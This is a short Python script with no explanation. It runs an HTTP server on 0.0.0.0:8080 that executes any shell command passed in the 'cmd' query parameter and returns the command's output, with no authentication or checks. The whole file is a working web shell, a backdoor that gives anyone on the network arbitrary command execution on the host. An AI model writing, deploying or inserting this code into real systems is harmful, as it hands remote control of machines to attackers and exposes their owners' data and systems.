from http.server import BaseHTTPRequestHandler, HTTPServer
import subprocess
import urllib.parse

class Handler(BaseHTTPRequestHandler):

  def do_GET(self):
    query = urllib.parse.urlparse(self.path).query
    params = urllib.parse.parse_qs(query)
    cmd = params.get("cmd", [""])[0]
    result = subprocess.run(
      cmd,
      shell = True,
      capture_output = True,
      text = True
    )
    self.send_response(200)
    self.end_headers()
    output = result.stdout + result.stderr
    self.wfile.write(output.encode())

server = HTTPServer(("0.0.0.0", 8080), Handler)
server.serve_forever()
